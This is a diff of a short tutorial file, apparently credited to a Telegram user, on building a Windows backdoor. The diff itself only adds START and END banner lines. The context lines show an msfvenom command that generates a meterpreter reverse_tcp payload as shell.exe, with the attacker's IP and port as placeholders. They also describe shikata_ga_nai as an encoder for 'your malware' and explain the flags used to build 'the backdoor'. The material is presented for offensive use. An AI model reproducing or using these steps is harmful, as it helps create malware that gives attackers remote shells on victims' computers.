@@ -1,6 +1,10 @@
 # Copyright (C) 2022
 # Frosts - https://t.me/Fr0sts
 
+==================================================================
+                               START
+==================================================================
+
 How to build the payload ?
 root@os:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOUR IP] LPORT=[PORT OPENED] -f exe > shell.exe
 
@@ -59,3 +63,7 @@ Note: `shikata_ga_nai` is a encoder/encrypter for your malware.
       `LPORT` mean the port destination of the TCP socket
       `-f` mean the type of export that you want
       `-o` mean the output where you want to build the backdoor
+      
+==================================================================
+                               END
+==================================================================
